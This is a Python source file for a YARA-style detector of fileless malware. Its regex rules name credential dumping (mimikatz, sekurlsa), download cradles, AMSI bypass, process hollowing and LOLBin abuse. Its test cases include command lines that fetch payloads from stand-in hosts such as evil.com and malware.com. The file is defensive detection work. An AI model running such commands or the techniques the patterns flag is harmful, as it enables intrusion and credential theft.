"""
yara_engine.py
Pure-Python YARA-like rule engine for fileless malware detection.
Simulates YARA signature scanning on process command lines and memory strings.
"""

import re
from dataclasses import dataclass, field
from typing import List, Dict


@dataclass
class YaraRule:
    name: str
    description: str
    severity: str          # LOW, MEDIUM, HIGH, CRITICAL
    category: str
    patterns: List[str]    # regex patterns to match
    min_matches: int = 1   # minimum patterns that must match


@dataclass
class YaraMatch:
    rule_name: str
    severity: str
    category: str
    matched_strings: List[str] = field(default_factory=list)


FILELESS_RULES: List[YaraRule] = [
    YaraRule(
        name='PowerShell_Encoded_Command',
        description='Base64-encoded PowerShell commands used in fileless attacks',
        severity='HIGH',
        category='fileless',
        patterns=[
            r'-[Ee][nN][cC][oO][dD][eE][dD][Cc][oO][mM][mM][aA][nN][dD]',
            r'-[Ee][nN][cC]\s',
            r'-[Ee]\s+[A-Za-z0-9+/]{20,}',
            r'[A-Za-z0-9+/]{60,}={0,2}',
        ],
        min_matches=1,
    ),
    YaraRule(
        name='Process_Hollowing_Marker',
        description='Process hollowing API sequences detected',
        severity='CRITICAL',
        category='injection',
        patterns=[
            r'NtUnmapViewOfSection',
            r'ZwUnmapViewOfSection',
            r'VirtualAllocEx.*WriteProcessMemory',
            r'CreateProcess.*SUSPENDED',
        ],
        min_matches=1,
    ),
    YaraRule(
        name='Reflective_DLL_Loading',
        description='Reflective DLL loading or injection',
        severity='CRITICAL',
        category='injection',
        patterns=[
            r'ReflectiveDllInjection',
            r'LoadLibraryR\b',
            r'ReflectiveLoader',
            r'dll.*inject',
        ],
        min_matches=1,
    ),
    YaraRule(
        name='Mimikatz_Credential_Dump',
        description='Mimikatz credential theft tool signatures',
        severity='CRITICAL',
        category='credential_theft',
        patterns=[
            r'mimikatz',
            r'sekurlsa',
            r'lsadump',
            r'kerberos::list',
            r'privilege::debug',
        ],
        min_matches=1,
    ),
    YaraRule(
        name='Cobalt_Strike_Beacon',
        description='Cobalt Strike C2 beacon strings',
        severity='CRITICAL',
        category='c2',
        patterns=[
            r'cobaltstrike',
            r'sleep_mask',
            r'beacon\.dll',
            r'ReflectiveLoader',
        ],
        min_matches=2,
    ),
    YaraRule(
        name='WMI_Based_Execution',
        description='WMI-based fileless execution techniques',
        severity='HIGH',
        category='fileless',
        patterns=[
            r'Win32_Process.*Create',
            r'WMImplant',
            r'Invoke-WMIMethod',
            r'wmic\s+process\s+call\s+create',
            r'wmic.*\/node:',
        ],
        min_matches=1,
    ),
    YaraRule(
        name='LOLBin_Abuse',
        description='Abuse of Living-off-the-Land Binaries',
        severity='MEDIUM',
        category='lolbin',
        patterns=[
            r'certutil\s+-decode',
            r'certutil\s+-urlcache',
            r'regsvr32\s+/s\s+/u\s+/i:http',
            r'mshta\s+http',
            r'bitsadmin.*transfer',
            r'msiexec.*http',
        ],
        min_matches=1,
    ),
    YaraRule(
        name='Suspicious_Download',
        description='Download from suspicious source during execution',
        severity='HIGH',
        category='network',
        patterns=[
            r'DownloadString\(',
            r'Net\.WebClient\)',
            r'Invoke-Expression.*http',
            r'IEX\s*\(',
            r'wget\s+http',
            r'curl\s+-[oO].*http',
        ],
        min_matches=1,
    ),
    YaraRule(
        name='PowerShell_Bypass_Policy',
        description='PowerShell execution policy bypass',
        severity='HIGH',
        category='fileless',
        patterns=[
            r'-[Ee]xecution[Pp]olicy\s+[Bb]ypass',
            r'-[Ee][Pp]\s+[Bb]ypass',
            r'Set-ExecutionPolicy\s+Unrestricted',
            r'-[Nn]o[Pp]rofile',
            r'-[Ww]indow[Ss]tyle\s+[Hh]idden',
        ],
        min_matches=1,
    ),
    YaraRule(
        name='AMSI_Bypass',
        description='AMSI (Antimalware Scan Interface) bypass attempt',
        severity='CRITICAL',
        category='evasion',
        patterns=[
            r'amsiInitFailed',
            r'AmsiScanBuffer',
            r'amsi\.dll',
            r'\[Ref\]\.Assembly.*amsi',
        ],
        min_matches=1,
    ),
]

SEVERITY_WEIGHTS = {
    'LOW': 1,
    'MEDIUM': 2,
    'HIGH': 3,
    'CRITICAL': 5,
}


class YaraEngine:
    def __init__(self, rules: List[YaraRule] = None):
        self.rules = rules or FILELESS_RULES

    def scan_string(self, text: str) -> List[YaraMatch]:
        if not text or not isinstance(text, str):
            return []

        matches = []
        text_lower = text.lower()

        for rule in self.rules:
            matched_strings = []
            for pattern in rule.patterns:
                try:
                    if re.search(pattern, text, re.IGNORECASE):
                        matched_strings.append(pattern)
                except re.error:
                    continue

            if len(matched_strings) >= rule.min_matches:
                matches.append(YaraMatch(
                    rule_name=rule.name,
                    severity=rule.severity,
                    category=rule.category,
                    matched_strings=matched_strings,
                ))

        return matches

    def scan_process(self, process_name: str, cmd_line: str,
                     extra_strings: List[str] = None) -> Dict:
        all_text = ' '.join(filter(None, [process_name, cmd_line] + (extra_strings or [])))
        matches = self.scan_string(all_text)

        total_score = sum(SEVERITY_WEIGHTS.get(m.severity, 1) for m in matches)
        max_severity = 'NONE'
        if matches:
            sev_order = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
            sev_levels = [m.severity for m in matches]
            max_severity = max(sev_levels, key=lambda s: sev_order.index(s))

        return {
            'hit_count': len(matches),
            'total_score': total_score,
            'max_severity': max_severity,
            'matched_rules': [m.rule_name for m in matches],
            'categories': list({m.category for m in matches}),
            'matches': matches,
        }

    def scan_dataframe_column(self, texts) -> List[int]:
        return [self.scan_string(str(t)).__len__() for t in texts]


def get_yara_features(df, cmd_col='cmd_line', name_col='process_name'):
    engine = YaraEngine()
    results = []
    for _, row in df.iterrows():
        r = engine.scan_process(
            str(row.get(name_col, '')),
            str(row.get(cmd_col, '')),
        )
        results.append({
            'yara_hit_count': r['hit_count'],
            'yara_total_score': r['total_score'],
            'yara_max_severity_code': {'NONE': 0, 'LOW': 1, 'MEDIUM': 2, 'HIGH': 3, 'CRITICAL': 4}.get(
                r['max_severity'], 0),
            'yara_categories_count': len(r['categories']),
        })
    return results


if __name__ == '__main__':
    engine = YaraEngine()

    test_cases = [
        ('powershell.exe', '-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...'),
        ('svchost.exe', 'C:\\Windows\\system32\\svchost.exe -k netsvcs'),
        ('wscript.exe', 'wscript.exe //e:jscript http://evil.com/payload.js'),
        ('certutil.exe', 'certutil -urlcache -split -f http://malware.com/shell.exe shell.exe'),
    ]

    for name, cmd in test_cases:
        result = engine.scan_process(name, cmd)
        print(f"\n[{name}] cmd: {cmd[:60]}...")
        print(f"  Hits: {result['hit_count']}  Score: {result['total_score']}  Severity: {result['max_severity']}")
        print(f"  Rules: {result['matched_rules']}")
